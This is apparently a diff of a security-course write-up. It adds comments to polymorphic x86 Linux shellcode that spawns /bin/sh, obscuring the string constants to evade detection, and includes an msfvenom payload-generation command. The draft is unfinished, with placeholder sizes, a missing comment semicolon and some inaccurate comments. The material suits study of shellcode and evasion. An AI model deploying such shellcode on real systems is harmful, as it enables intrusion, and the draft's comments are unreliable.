@@ -95,29 +95,39 @@ $
 The polymorphic version based on the original shellcode is ?? bytes long, which equates to ?% increase in size from the reference:
 
 ```nasm
-global _start           
+ Filename: execve_poly.nasm
+; Author: h3ll0clar1c3
+; Purpose: Spawn a shell on the local host
+; Compilation: ./compile.sh execve_poly
+; Usage: ./execve_poly
+; Shellcode size: ??? bytes
+; Architecture: x86
+
+global   _start
 
 section .text
+        _start:
 
-_start:
-    xor edx, edx    
-    push edx
-    mov eax, 0x563ED8B7
-    add eax, 0x12345678
-    push eax
-    mov eax, 0xDEADC0DE
-    sub eax, 0x70445EAF
-    push eax
-    push byte 0xb
-    pop eax
-    mov ecx, edx
-    mov ebx, esp
-    push byte 0x1
-    pop esi
-    int 0x80
-    xchg esi, eax
-    int 0x80
+        xor edx, edx                    ; initialize register // changed register value
+        push edx                        ; push edx onto the stack // changed the register value
+        mov eax, 0x563ED8B7             ; move 0x563ED8B7 into eax // split to add up to original value /bin/sh
+        add eax, 0x12345678             ; move 0x12345678 into eax // split to add up to original value /bin/sh
+        push eax                        ; push eax onto the stack // added instruction
+        mov eax, 0xDEADC0DE             ; move 0xDEADC0DE into eax // split to add up to original value /bin/sh
+        sub eax, 0x70445EAF             ; move 0x70445EAF into eax // split to add up to original value /bin/sh
+        push eax                        ; push eax onto the stack // added instruction
+        push byte 0xb                   ; push 0xb onto the stack // changed the method
+        pop eax                         ; pop eax off the stack // added instruction
+        mov ecx, edx                    ; move edx into ecx // changed the register value
+        mov ebx, esp                    ; move esp into ebx // changed the order
+        push byte 0x1                   ; push 0x1 onto the stacked // added instruction
+        pop esi                         ; pop esi off the stack // added instruction
+        int 0x80                        ; call the interrupt to execute the execve syscall
+        xchg esi, eax                   ; exchange eax with esi // added instruction
+        int 0x80                        ; call the interrupt to execute the execve syscall, execute /bin/sh shell
 ```
+
+What's my shellcode size ??? edit shellcode comments
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 --platform linux -f c
